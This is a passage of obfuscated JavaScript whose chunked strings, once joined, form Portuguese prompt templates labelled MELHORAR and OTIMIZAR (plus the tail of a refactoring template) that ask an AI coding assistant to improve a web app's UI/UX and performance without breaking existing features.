d'+'e\x20r'+'esp'+'ons'+'abi'+'lid'+'ade'+'s\x0a-'+'\x20Me'+'lho'+'rar'+'\x20re'+'uti'+'liz'+'açã'+'o\x20d'+'e\x20c'+'omp'+'one'+'nte'+'s\x0a-'+'\x20Me'+'lho'+'rar'+'\x20or'+'gan'+'iza'+'ção'+'\x20da'+'\x20ar'+'qui'+'tet'+'ura'+'\x0a-\x20'+'Cri'+'ar\x20'+'pad'+'rõe'+'s\x20c'+'ons'+'ist'+'ent'+'es\x20'+'no\x20'+'pro'+'jet'+'o\x0a-'+'\x20Fa'+'cil'+'ita'+'r\x20m'+'anu'+'ten'+'ção'+'\x20fu'+'tur'+'a\x0a-'+'\x20Re'+'duz'+'ir\x20'+'com'+'ple'+'xid'+'ade'+'\x20de'+'sne'+'ces'+'sár'+'ia\x0a'+'-\x20M'+'elh'+'ora'+'r\x20e'+'sca'+'lab'+'ili'+'dad'+'e\x20d'+'o\x20s'+'ist'+'ema'+'\x0a-\x20'+'Tor'+'nar'+'\x20o\x20'+'cód'+'igo'+'\x20ma'+'is\x20'+'pre'+'vis'+'íve'+'l\x20e'+'\x20li'+'mpo'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aDI'+'RET'+'RIZ'+'ES\x20'+'DE\x20'+'REF'+'ACT'+'ORI'+'NG\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'-\x20N'+'ÃO\x20'+'alt'+'era'+'r\x20f'+'unc'+'ion'+'ali'+'dad'+'es\x20'+'exi'+'ste'+'nte'+'s\x0a-'+'\x20NÃ'+'O\x20m'+'uda'+'r\x20c'+'omp'+'ort'+'ame'+'nto'+'\x20da'+'\x20in'+'ter'+'fac'+'e\x0a-'+'\x20NÃ'+'O\x20m'+'odi'+'fic'+'ar\x20'+'des'+'ign'+'\x20vi'+'sua'+'l\x20s'+'em\x20'+'nec'+'ess'+'ida'+'de\x0a'+'-\x20N'+'ÃO\x20'+'que'+'bra'+'r\x20f'+'lux'+'os\x20'+'já\x20'+'exi'+'ste'+'nte'+'s\x0a\x0a'+'Pri'+'ori'+'ze\x20'+'sem'+'pre'+':\x0a\x0a'+'-\x20S'+'epa'+'raç'+'ão\x20'+'de\x20'+'res'+'pon'+'sab'+'ili'+'dad'+'es\x20'+'(UI'+'\x20/\x20'+'lóg'+'ica'+'\x20/\x20'+'dad'+'os)'+'\x0a-\x20'+'Com'+'pon'+'ent'+'iza'+'ção'+'\x20in'+'tel'+'ige'+'nte'+'\x0a-\x20'+'Reu'+'til'+'iza'+'ção'+'\x20de'+'\x20có'+'dig'+'o\x0a-'+'\x20Fu'+'nçõ'+'es\x20'+'peq'+'uen'+'as\x20'+'e\x20b'+'em\x20'+'def'+'ini'+'das'+'\x0a-\x20'+'Nom'+'eaç'+'ão\x20'+'cla'+'ra\x20'+'e\x20c'+'ons'+'ist'+'ent'+'e\x0a-'+'\x20El'+'imi'+'naç'+'ão\x20'+'de\x20'+'cód'+'igo'+'\x20du'+'pli'+'cad'+'o\x0a-'+'\x20Or'+'gan'+'iza'+'ção'+'\x20po'+'r\x20d'+'omí'+'nio'+'\x20ou'+'\x20fe'+'atu'+'re\x0a'+'-\x20R'+'edu'+'ção'+'\x20de'+'\x20co'+'mpl'+'exi'+'dad'+'e\x20p'+'or\x20'+'a')+('rqu'+'ivo'+'\x0a-\x20'+'Pad'+'ron'+'iza'+'ção'+'\x20de'+'\x20pa'+'drõ'+'es\x20'+'de\x20'+'cód'+'igo'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aPA'+'DRÕ'+'ES\x20'+'DE\x20'+'QUA'+'LID'+'ADE'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'Cód'+'igo'+'\x20li'+'mpo'+'\x20e\x20'+'leg'+'íve'+'l\x0a-'+'\x20Ar'+'qui'+'tet'+'ura'+'\x20co'+'nsi'+'ste'+'nte'+'\x20em'+'\x20to'+'do\x20'+'pro'+'jet'+'o\x0a-'+'\x20Co'+'mpo'+'nen'+'tes'+'\x20de'+'sac'+'opl'+'ado'+'s\x0a-'+'\x20Ho'+'oks'+'\x20re'+'uti'+'liz'+'áve'+'is\x20'+'e\x20b'+'em\x20'+'def'+'ini'+'dos'+'\x0a-\x20'+'Ser'+'viç'+'os\x20'+'cen'+'tra'+'liz'+'ado'+'s\x20p'+'ara'+'\x20AP'+'I\x0a-'+'\x20Se'+'par'+'açã'+'o\x20c'+'lar'+'a\x20e'+'ntr'+'e\x20f'+'ron'+'ten'+'d\x20e'+'\x20ló'+'gic'+'a\x20d'+'e\x20n'+'egó'+'cio'+'\x0a-\x20'+'Est'+'rut'+'ura'+'\x20pr'+'evi'+'sív'+'el\x20'+'e\x20e'+'sca'+'láv'+'el\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'PRO'+'CES'+'SO\x20'+'OBR'+'IGA'+'TÓR'+'IO\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'1.\x20'+'Ana'+'lis'+'e\x20t'+'oda'+'\x20a\x20'+'bas'+'e\x20d'+'e\x20c'+'ódi'+'go\x0a'+'2.\x20'+'Ide'+'nti'+'fiq'+'ue\x20'+'pon'+'tos'+'\x20de'+'\x20me'+'lho'+'ria'+'\x20es'+'tru'+'tur'+'al\x0a'+'3.\x20'+'Lis'+'te\x20'+'pro'+'ble'+'mas'+'\x20de'+'\x20or'+'gan'+'iza'+'ção'+'\x20e\x20'+'dup'+'lic'+'açã'+'o\x0a4'+'.\x20P'+'rio'+'riz'+'e\x20m'+'elh'+'ori'+'as\x20'+'por'+'\x20im'+'pac'+'to\x0a'+'5.\x20'+'Exe'+'cut'+'e\x20r'+'efa'+'tor'+'açõ'+'es\x20'+'de\x20'+'for'+'ma\x20'+'seg'+'ura'+'\x0a6.'+'\x20Ga'+'ran'+'ta\x20'+'que'+'\x20na'+'da\x20'+'do\x20'+'sis'+'tem'+'a\x20q'+'ueb'+'re\x0a'+'7.\x20'+'Val'+'ide'+'\x20co'+'nsi'+'stê'+'nci'+'a\x20a'+'pós'+'\x20mu'+'dan'+'ças'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aRE'+'SUL'+'TAD'+'O\x20E'+'SPE'+'RAD'+'O\x0a━'+''+''+''+''+''+''+'\x0a\x0aA'+'o\x20f'+'ina'+'l\x20d'+'a\x20r'+'efa'+'tor'+'açã'+'o,\x20'+'o\x20p'+'roj'+'eto'+'\x20de'+'ve\x20'+'est'+'ar:'+'\x0a\x0a-'+'\x20Mu'+'ito'+'\x20ma'+'is\x20'+'org'+'ani'+'zad'+'o\x0a-'+'\x20Fá'+'cil'+'\x20de'+'\x20en'+'ten'+'der'+'\x20e\x20'+'man'+'ter'+'\x0a-\x20'+'Esc'+'alá'+'vel'+'\x20pa'+'ra\x20'+'nov'+'as\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x0a-\x20'+'Liv'+'re\x20'+'de\x20'+'dup'+'lic'+'açõ'+'es\x20'+'des'+'nec'+'ess'+'ári'+'as\x0a'+'-\x20C'+'om\x20'+'arq'+'uit'+'etu'+'ra\x20'+'mai'+'s\x20p'+'rof'+'iss'+'ion'+'al\x0a'+'-\x20C'+'om\x20'+'pad'+'rõe'+'s\x20c'+'ons'+'ist'+'ent'+'es\x0a'+'-')+('\x20Ma'+'is\x20'+'lim'+'po\x20'+'e\x20p'+'rev'+'isí'+'vel'+'\x0a-\x20'+'Sem'+'\x20al'+'ter'+'ar\x20'+'nen'+'hum'+'a\x20f'+'unc'+'ion'+'ali'+'dad'+'e\x20e'+'xis'+'ten'+'te');
const _n38da06={
}
;
_n38da06['id']='qa-'+'mel'+'hor'+'ar',_n38da06['emo'+'ji']='🎨',_n38da06['lab'+'el']='MEL'+'HOR'+'AR',_n38da06['tex'+'t']='Ana'+'lis'+'e\x20c'+'omp'+'let'+'ame'+'nte'+'\x20to'+'da\x20'+'a\x20a'+'pli'+'caç'+'ão\x20'+'ant'+'es\x20'+'de\x20'+'rea'+'liz'+'ar\x20'+'qua'+'lqu'+'er\x20'+'alt'+'era'+'ção'+'\x20e\x20'+'exe'+'cut'+'e\x20u'+'ma\x20'+'mel'+'hor'+'ia\x20'+'pro'+'fun'+'da\x20'+'de\x20'+'UI/'+'UX\x20'+'em\x20'+'tod'+'o\x20o'+'\x20si'+'ste'+'ma.'+'\x0a\x0aS'+'eu\x20'+'obj'+'eti'+'vo\x20'+'é\x20e'+'lev'+'ar\x20'+'o\x20n'+'íve'+'l\x20v'+'isu'+'al\x20'+'e\x20d'+'e\x20e'+'xpe'+'riê'+'nci'+'a\x20d'+'o\x20u'+'suá'+'rio'+'\x20pa'+'ra\x20'+'um\x20'+'pad'+'rão'+'\x20mo'+'der'+'no,'+'\x20pr'+'emi'+'um\x20'+'e\x20a'+'lta'+'men'+'te\x20'+'int'+'uit'+'ivo'+',\x20s'+'em\x20'+'alt'+'era'+'r\x20f'+'unc'+'ion'+'ali'+'dad'+'es\x20'+'exi'+'ste'+'nte'+'s.\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'OBJ'+'ETI'+'VO\x20'+'PRI'+'NCI'+'PAL'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aTr'+'ans'+'for'+'mar'+'\x20a\x20'+'int'+'erf'+'ace'+'\x20em'+'\x20um'+'a\x20e'+'xpe'+'riê'+'nci'+'a:\x0a'+'-\x20M'+'ais'+'\x20cl'+'ara'+'\x0a-\x20'+'Mai'+'s\x20i'+'ntu'+'iti'+'va\x0a'+'-\x20M'+'ais'+'\x20mo'+'der'+'na\x0a'+'-\x20M'+'ais'+'\x20co'+'nsi'+'ste'+'nte'+'\x0a-\x20'+'Mai'+'s\x20a'+'gra'+'dáv'+'el\x20'+'de\x20'+'usa'+'r\x0a-'+'\x20Ma'+'is\x20'+'pro'+'fis'+'sio'+'nal'+'\x20vi'+'sua'+'lme'+'nte'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aAN'+'ÁLI'+'SE\x20'+'OBR'+'IGA'+'TÓR'+'IA\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Ant'+'es\x20'+'de\x20'+'mod'+'ifi'+'car'+'\x20qu'+'alq'+'uer'+'\x20co'+'isa'+',\x20a'+'nal'+'ise'+':\x0a\x0a'+'-\x20E'+'str'+'utu'+'ra\x20'+'vis'+'ual'+'\x20ge'+'ral'+'\x20do'+'\x20si'+'ste'+'ma\x0a'+'-\x20H'+'ier'+'arq'+'uia'+'\x20de'+'\x20in'+'for'+'maç'+'ão\x0a'+'-\x20C'+'ons'+'ist'+'ênc'+'ia\x20'+'de\x20'+'com'+'pon'+'ent'+'es\x0a'+'-\x20L'+'ayo'+'uts'+'\x20de'+'\x20pá'+'gin'+'as\x0a'+'-\x20E'+'spa'+'çam'+'ent'+'os\x20'+'e\x20a'+'lin'+'ham'+'ent'+'os\x0a'+'-\x20T'+'ipo'+'gra'+'fia'+'\x20e\x20'+'leg'+'ibi'+'lid'+'ade'+'\x0a-\x20'+'Cor'+'es\x20'+'e\x20c'+'ont'+'ras'+'te\x0a'+'-\x20B'+'otõ'+'es\x20'+'e\x20e'+'lem'+'ent'+'os\x20'+'int'+'era'+'tiv'+'os\x0a'+'-\x20F'+'lux'+'os\x20'+'de\x20'+'nav'+'ega'+'ção'+'\x20do'+'\x20us'+'uár'+'io\x0a'+'-\x20E'+'sta'+'dos'+'\x20(l'+'oad'+'ing'+',\x20e'+'mpt'+'y,\x20'+'err'+'or,'+'\x20su'+'cce'+'ss)'+'\x0a-\x20'+'Res'+'pon'+'siv'+'ida'+'de\x20'+'mob'+'ile'+'\x20e\x20'+'des'+'kto'+'p\x0a-'+'\x20Fe'+'edb'+'ack'+'\x20vi'+'sua'+'l\x20d'+'e\x20a'+'çõe'+'s\x0a-'+'\x20Mi'+'cro'+'i'+('nte'+'raç'+'ões'+'\x20ex'+'ist'+'ent'+'es\x0a'+'-\x20U'+'sab'+'ili'+'dad'+'e\x20g'+'era'+'l\x20d'+'o\x20s'+'ist'+'ema'+'\x0a-\x20'+'Cla'+'rez'+'a\x20d'+'os\x20'+'for'+'mul'+'ári'+'os\x0a'+'-\x20O'+'rga'+'niz'+'açã'+'o\x20d'+'e\x20c'+'ont'+'eúd'+'o\x0a-'+'\x20De'+'nsi'+'dad'+'e\x20v'+'isu'+'al\x20'+'(mu'+'ito'+'\x20ch'+'eio'+'\x20vs'+'\x20mu'+'ito'+'\x20va'+'zio'+')\x0a\x0a'+''+''+''+''+''+''+'━\x0aM'+'ELH'+'ORI'+'AS\x20'+'DE\x20'+'UI\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Apr'+'imo'+'rar'+'\x20to'+'da\x20'+'a\x20i'+'nte'+'rfa'+'ce\x20'+'com'+'\x20fo'+'co\x20'+'em:'+'\x0a\x0aV'+'ISU'+'AL\x20'+'MOD'+'ERN'+'O:\x0a'+'-\x20M'+'elh'+'ora'+'r\x20h'+'ier'+'arq'+'uia'+'\x20vi'+'sua'+'l\x0a-'+'\x20Pa'+'dro'+'niz'+'ar\x20'+'esp'+'aça'+'men'+'tos'+'\x20(g'+'rid'+'\x20co'+'nsi'+'ste'+'nte'+')\x0a-'+'\x20Me'+'lho'+'rar'+'\x20al'+'inh'+'ame'+'nto'+'\x20de'+'\x20el'+'eme'+'nto'+'s\x0a-'+'\x20Cr'+'iar'+'\x20co'+'nsi'+'stê'+'nci'+'a\x20e'+'ntr'+'e\x20p'+'ági'+'nas'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'com'+'pos'+'içã'+'o\x20v'+'isu'+'al\x20'+'ger'+'al\x0a'+'-\x20A'+'jus'+'tar'+'\x20pr'+'opo'+'rçõ'+'es\x20'+'de\x20'+'ele'+'men'+'tos'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'lei'+'tur'+'a\x20e'+'\x20es'+'can'+'eab'+'ili'+'dad'+'e\x0a\x0a'+'TIP'+'OGR'+'AFI'+'A:\x0a'+'-\x20M'+'elh'+'ora'+'r\x20h'+'ier'+'arq'+'uia'+'\x20de'+'\x20tí'+'tul'+'os\x0a'+'-\x20A'+'jus'+'tar'+'\x20ta'+'man'+'hos'+'\x20de'+'\x20fo'+'nte'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'esp'+'aça'+'men'+'to\x20'+'ent'+'re\x20'+'lin'+'has'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'leg'+'ibi'+'lid'+'ade'+'\x20ge'+'ral'+'\x0a-\x20'+'Pad'+'ron'+'iza'+'r\x20e'+'sti'+'los'+'\x20de'+'\x20te'+'xto'+'\x0a\x0aC'+'ORE'+'S\x20E'+'\x20CO'+'NTR'+'AST'+'E:\x0a'+'-\x20M'+'elh'+'ora'+'r\x20c'+'ont'+'ras'+'te\x20'+'par'+'a\x20a'+'ces'+'sib'+'ili'+'dad'+'e\x0a-'+'\x20Pa'+'dro'+'niz'+'ar\x20'+'pal'+'eta'+'\x20de'+'\x20co'+'res'+'\x0a-\x20'+'Cor'+'rig'+'ir\x20'+'cor'+'es\x20'+'inc'+'ons'+'ist'+'ent'+'es\x0a'+'-\x20M'+'elh'+'ora'+'r\x20e'+'sta'+'dos'+'\x20(h'+'ove'+'r,\x20'+'act'+'ive'+',\x20d'+'isa'+'ble'+'d)\x0a'+'\x0aCO'+'MPO'+'NEN'+'TES'+':\x0a-'+'\x20Pa'+'dro'+'niz'+'ar\x20'+'bot'+'ões'+'\x20(t'+'ama'+'nho'+'s,\x20'+'est'+'ilo'+'s,\x20'+'est'+'ado'+'s)\x0a'+'-\x20M'+'elh'+'ora'+'r\x20c'+'ard'+'s\x20e'+'\x20co'+'nta'+'ine'+'rs\x0a'+'-\x20U'+'nif'+'ica'+'r\x20e'+'sti'+'los'+'\x20de'+'\x20in'+'put'+'s\x20e'+'\x20fo'+'rmu'+'lár'+'ios'+'\x0a-\x20'+'Mel'+'hor'+'a')+('r\x20m'+'oda'+'is\x20'+'e\x20d'+'rop'+'dow'+'ns\x0a'+'-\x20C'+'ria'+'r\x20c'+'ons'+'ist'+'ênc'+'ia\x20'+'ent'+'re\x20'+'com'+'pon'+'ent'+'es\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'MEL'+'HOR'+'IAS'+'\x20DE'+'\x20UX'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aFO'+'CO\x20'+'NA\x20'+'EXP'+'ERI'+'ÊNC'+'IA\x20'+'DO\x20'+'USU'+'ÁRI'+'O:\x0a'+'\x0a-\x20'+'Tor'+'nar'+'\x20na'+'veg'+'açã'+'o\x20m'+'ais'+'\x20in'+'tui'+'tiv'+'a\x0a-'+'\x20Re'+'duz'+'ir\x20'+'fri'+'cçã'+'o\x20e'+'m\x20f'+'lux'+'os\x20'+'imp'+'ort'+'ant'+'es\x0a'+'-\x20M'+'elh'+'ora'+'r\x20c'+'lar'+'eza'+'\x20da'+'s\x20a'+'çõe'+'s\x20p'+'rin'+'cip'+'ais'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'fee'+'dba'+'ck\x20'+'ao\x20'+'usu'+'ári'+'o\x0a-'+'\x20Me'+'lho'+'rar'+'\x20es'+'tad'+'os\x20'+'de\x20'+'car'+'reg'+'ame'+'nto'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'men'+'sag'+'ens'+'\x20de'+'\x20er'+'ro\x20'+'e\x20s'+'uce'+'sso'+'\x0a-\x20'+'Sim'+'pli'+'fic'+'ar\x20'+'int'+'era'+'çõe'+'s\x20c'+'omp'+'lex'+'as\x0a'+'-\x20M'+'elh'+'ora'+'r\x20f'+'lux'+'o\x20d'+'e\x20f'+'orm'+'ulá'+'rio'+'s\x0a-'+'\x20To'+'rna'+'r\x20a'+'çõe'+'s\x20m'+'ais'+'\x20pr'+'evi'+'sív'+'eis'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'des'+'cob'+'ert'+'a\x20d'+'e\x20f'+'unc'+'ion'+'ali'+'dad'+'es\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'MIC'+'ROI'+'NTE'+'RAÇ'+'ÕES'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'Adi'+'cio'+'nar'+'/tr'+'ans'+'ici'+'ona'+'r\x20e'+'sta'+'dos'+'\x20de'+'\x20ho'+'ver'+'\x20su'+'ave'+'s\x0a-'+'\x20Me'+'lho'+'rar'+'\x20fe'+'edb'+'ack'+'\x20vi'+'sua'+'l\x20d'+'e\x20c'+'liq'+'ues'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'tra'+'nsi'+'çõe'+'s\x20e'+'ntr'+'e\x20e'+'sta'+'dos'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'ani'+'maç'+'ões'+'\x20le'+'ves'+'\x20e\x20'+'não'+'\x20in'+'tru'+'siv'+'as\x0a'+'-\x20E'+'vit'+'ar\x20'+'ani'+'maç'+'ões'+'\x20pe'+'sad'+'as\x20'+'ou\x20'+'exa'+'ger'+'ada'+'s\x0a-'+'\x20Ga'+'ran'+'tir'+'\x20fl'+'uid'+'ez\x20'+'vis'+'ual'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aRE'+'SPO'+'NSI'+'VID'+'ADE'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'lay'+'out'+'\x20mo'+'bil'+'e-f'+'irs'+'t\x0a-'+'\x20Aj'+'ust'+'ar\x20'+'esp'+'aça'+'men'+'tos'+'\x20em'+'\x20te'+'las'+'\x20pe'+'que'+'nas'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'usa'+'bil'+'ida'+'de\x20'+'tou'+'ch\x0a'+'-\x20E'+'vit'+'ar\x20'+'ele'+'men'+'tos'+'\x20pe'+'que'+'nos'+'\x20de'+'mai'+'s\x0a-'+'\x20Ga'+'r')+('ant'+'ir\x20'+'boa'+'\x20le'+'itu'+'ra\x20'+'no\x20'+'mob'+'ile'+'\x0a-\x20'+'Aju'+'sta'+'r\x20g'+'rid'+'s\x20r'+'esp'+'ons'+'ivo'+'s\x0a\x0a'+''+''+''+''+''+''+'━\x0aP'+'RIN'+'CÍP'+'IOS'+'\x20IM'+'POR'+'TAN'+'TES'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'NÃO'+'\x20al'+'ter'+'ar\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20ex'+'ist'+'ent'+'es\x0a'+'-\x20N'+'ÃO\x20'+'rem'+'ove'+'r\x20f'+'eat'+'ure'+'s\x0a-'+'\x20NÃ'+'O\x20q'+'ueb'+'rar'+'\x20fl'+'uxo'+'s\x20a'+'tua'+'is\x0a'+'-\x20N'+'ÃO\x20'+'mud'+'ar\x20'+'ide'+'nti'+'dad'+'e\x20v'+'isu'+'al\x20'+'sem'+'\x20ne'+'ces'+'sid'+'ade'+'\x20ex'+'tre'+'ma\x0a'+'-\x20P'+'rio'+'riz'+'ar\x20'+'con'+'sis'+'tên'+'cia'+'\x20ac'+'ima'+'\x20de'+'\x20mu'+'dan'+'ças'+'\x20ra'+'dic'+'ais'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'sem'+'\x20de'+'sca'+'rac'+'ter'+'iza'+'r\x20o'+'\x20si'+'ste'+'ma\x0a'+'-\x20M'+'ant'+'er\x20'+'per'+'for'+'man'+'ce\x20'+'lev'+'e\x20e'+'\x20fl'+'uid'+'a\x0a\x0a'+''+''+''+''+''+''+'━\x0aR'+'ESU'+'LTA'+'DO\x20'+'ESP'+'ERA'+'DO\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'Ao\x20'+'fin'+'al,'+'\x20o\x20'+'sis'+'tem'+'a\x20d'+'eve'+'\x20pa'+'rec'+'er:'+'\x0a\x0a-'+'\x20Ma'+'is\x20'+'pro'+'fis'+'sio'+'nal'+'\x0a-\x20'+'Mai'+'s\x20m'+'ode'+'rno'+'\x0a-\x20'+'Mai'+'s\x20p'+'oli'+'do\x20'+'vis'+'ual'+'men'+'te\x0a'+'-\x20M'+'ais'+'\x20fá'+'cil'+'\x20de'+'\x20us'+'ar\x0a'+'-\x20M'+'ais'+'\x20in'+'tui'+'tiv'+'o\x0a-'+'\x20Ma'+'is\x20'+'con'+'sis'+'ten'+'te\x0a'+'-\x20M'+'ais'+'\x20ag'+'rad'+'áve'+'l\x20d'+'e\x20n'+'ave'+'gar'+'\x0a-\x20'+'Com'+'\x20UX'+'\x20cl'+'ara'+'men'+'te\x20'+'mel'+'hor'+'ada'+'\x20em'+'\x20to'+'dos'+'\x20os'+'\x20fl'+'uxo'+'s');
const _n11ab2f={
}
;
_n11ab2f['id']='qa-'+'oti'+'miz'+'ar',_n11ab2f['emo'+'ji']='🚀',_n11ab2f['lab'+'el']='OTI'+'MIZ'+'AR',_n11ab2f['tex'+'t']='Ana'+'lis'+'e\x20c'+'omp'+'let'+'ame'+'nte'+'\x20to'+'do\x20'+'o\x20p'+'roj'+'eto'+'\x20an'+'tes'+'\x20de'+'\x20re'+'ali'+'zar'+'\x20qu'+'alq'+'uer'+'\x20al'+'ter'+'açã'+'o.\x0a'+'\x0aQu'+'ero'+'\x20qu'+'e\x20v'+'ocê'+'\x20fa'+'ça\x20'+'uma'+'\x20ot'+'imi'+'zaç'+'ão\x20'+'pro'+'fun'+'da\x20'+'em\x20'+'tod'+'a\x20a'+'\x20ap'+'lic'+'açã'+'o\x20c'+'om\x20'+'foc'+'o\x20t'+'ota'+'l\x20e'+'m\x20p'+'erf'+'orm'+'anc'+'e,\x20'+'flu'+'ide'+'z\x20d'+'e\x20n'+'ave'+'gaç'+'ão,'+'\x20ve'+'loc'+'ida'+'de\x20'+'de\x20'+'car'+'reg'+'ame'+'nto'+'\x20e\x20'+'exp'+'eri'+'ênc'+'ia\x20'+'do\x20'+'usu'+'ári'+'o.\x0a'+'\x0aSe'+'u\x20o'+'bje'+'tiv'+'o\x20é'+'\x20tr'+'ans'+'for'+'mar'+'\x20o\x20'+'sis'+'tem'+'a\x20e'+'m\x20u'+'ma\x20'+'apl'+'ica'+'ção'+'\x20ex'+'tre'+'mam'+'ent'+'e\x20r'+'ápi'+'da,'+'\x20le'+'ve,'+'\x20fl'+'uid'+'a\x20e'+'\x20re'+'spo'+'nsi'+'va\x20'+'tan'+'to\x20'+'no\x20'+'des'+'kto'+'p\x20q'+'uan'+'to\x20'+'no\x20'+'mob'+'ile'+'.\x0a\x0a'+'Faç'+'a\x20u'+'ma\x20'+'aná'+'lis'+'e\x20c'+'omp'+'let'+'a\x20d'+'e:\x0a'+'-\x20E'+'str'+'utu'+'ra\x20'+'do\x20'+'pro'+'jet'+'o\x0a-'+'\x20Ro'+'tas'+'\x20e\x20'+'nav'+'ega'+'ção'+'\x0a-\x20'+'Com'+'pon'+'ent'+'es\x0a'+'-\x20H'+'ook'+'s\x0a-'+'\x20Es'+'tad'+'os\x20'+'glo'+'bai'+'s\x0a-'+'\x20Qu'+'eri'+'es\x0a'+'-\x20I'+'nte'+'gra'+'çõe'+'s\x20c'+'om\x20'+'Sup'+'aba'+'se\x0a'+'-\x20C'+'ham'+'ada'+'s\x20A'+'PI\x0a'+'-\x20R'+'end'+'eri'+'zaç'+'ões'+'\x20de'+'sne'+'ces'+'sár'+'ias'+'\x0a-\x20'+'Bun'+'dle'+'\x20si'+'ze\x0a'+'-\x20A'+'sse'+'ts\x0a'+'-\x20I'+'mag'+'ens'+'\x0a-\x20'+'CSS'+'\x0a-\x20'+'Scr'+'ipt'+'s\x0a-'+'\x20Co'+'nsu'+'mo\x20'+'de\x20'+'mem'+'óri'+'a\x0a-'+'\x20Po'+'ssí'+'vei'+'s\x20g'+'arg'+'alo'+'s\x20d'+'e\x20p'+'erf'+'orm'+'anc'+'e\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20c'+'arr'+'ega'+'men'+'to\x0a'+'-\x20P'+'rob'+'lem'+'as\x20'+'de\x20'+'hid'+'rat'+'açã'+'o\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20r'+'eat'+'ivi'+'dad'+'e\x0a-'+'\x20Pr'+'obl'+'ema'+'s\x20d'+'e\x20U'+'X/p'+'erf'+'orm'+'anc'+'e\x20v'+'isu'+'al\x0a'+'\x0aAp'+'ós\x20'+'ana'+'lis'+'ar:'+'\x0a1.'+'\x20Id'+'ent'+'ifi'+'que'+'\x20to'+'dos'+'\x20os'+'\x20ga'+'rga'+'los'+'\x0a2.'+'\x20Ex'+'pli'+'que'+'\x20o\x20'+'imp'+'act'+'o\x20d'+'e\x20c'+'ada'+'\x20pr'+'obl'+'ema'+'\x0a3.'+'\x20Pr'+'ior'+'ize'+'\x20as'+'\x20ot'+'imi'+'zaç'+'ões'+'\x20ma'+'is\x20'+'imp'+'ort'+'ant'+'es\x0a'+'4.\x20'+'Exe'+'cut'+'e\x20m'+'elh'+'ori'+'as\x20'+'pro'+'fis'+'sio'+'nai'+'s\x20s'+'em\x20'+'que'+'bra'+'r\x20f'+'unc'+'ion'+'ali'+'dad'+'es\x20'+'e'+('xis'+'ten'+'tes'+'\x0a\x0aO'+'tim'+'ize'+'\x20pr'+'inc'+'ipa'+'lme'+'nte'+':\x0a\x0a'+'PER'+'FOR'+'MAN'+'CE\x20'+'FRO'+'NTE'+'ND\x0a'+'-\x20L'+'azy'+'\x20lo'+'adi'+'ng\x0a'+'-\x20C'+'ode'+'\x20sp'+'lit'+'tin'+'g\x0a-'+'\x20Me'+'moi'+'zaç'+'ão\x0a'+'-\x20R'+'e-r'+'end'+'eri'+'zaç'+'ões'+'\x0a-\x20'+'Imp'+'ort'+'s\x20d'+'esn'+'ece'+'ssá'+'rio'+'s\x0a-'+'\x20Co'+'mpo'+'nen'+'tes'+'\x20pe'+'sad'+'os\x0a'+'-\x20E'+'sta'+'dos'+'\x20ma'+'l\x20o'+'tim'+'iza'+'dos'+'\x0a-\x20'+'Cac'+'he\x0a'+'-\x20P'+'ref'+'etc'+'h\x20d'+'e\x20p'+'ági'+'nas'+'\x0a-\x20'+'Car'+'reg'+'ame'+'nto'+'\x20in'+'tel'+'ige'+'nte'+'\x0a-\x20'+'Sus'+'pen'+'se/'+'loa'+'din'+'g\x20s'+'tat'+'es\x0a'+'-\x20B'+'und'+'le\x20'+'JS\x0a'+'\x0aNA'+'VEG'+'AÇÃ'+'O\x0a-'+'\x20To'+'rna'+'r\x20t'+'ran'+'siç'+'ões'+'\x20en'+'tre'+'\x20pá'+'gin'+'as\x20'+'mai'+'s\x20f'+'lui'+'das'+'\x0a-\x20'+'Red'+'uzi'+'r\x20d'+'ela'+'ys\x20'+'ent'+'re\x20'+'rot'+'as\x0a'+'-\x20M'+'elh'+'ora'+'r\x20c'+'arr'+'ega'+'men'+'to\x20'+'de\x20'+'pág'+'ina'+'s\x0a-'+'\x20Ev'+'ita'+'r\x20p'+'isc'+'ada'+'s\x20v'+'isu'+'ais'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'exp'+'eri'+'ênc'+'ia\x20'+'SPA'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'res'+'pon'+'siv'+'ida'+'de\x20'+'da\x20'+'int'+'erf'+'ace'+'\x0a\x0aS'+'UPA'+'BAS'+'E\x20/'+'\x20BA'+'CKE'+'ND\x0a'+'-\x20O'+'tim'+'iza'+'r\x20q'+'uer'+'ies'+'\x0a-\x20'+'Red'+'uzi'+'r\x20r'+'equ'+'est'+'s\x20d'+'esn'+'ece'+'ssá'+'rio'+'s\x0a-'+'\x20Me'+'lho'+'rar'+'\x20pa'+